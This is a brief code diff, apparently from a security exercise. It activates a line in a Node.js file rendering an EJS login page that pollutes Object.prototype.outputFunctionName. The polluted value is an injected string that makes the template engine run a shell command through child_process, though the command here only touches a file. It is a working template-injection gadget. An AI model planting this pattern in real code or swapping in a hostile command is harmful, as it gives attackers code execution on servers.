@@ -2,7 +2,7 @@ const ejs = require('ejs')
 const path = require('path');
 const templatePath = path.join(__dirname, 'views', 'login_register.ejs');
 
-// Object.prototype.outputFunctionName = "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"
+Object.prototype.outputFunctionName = "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"
 
 var result = ejs.renderFile(templatePath, {
     title:" storeHtml | logins ",
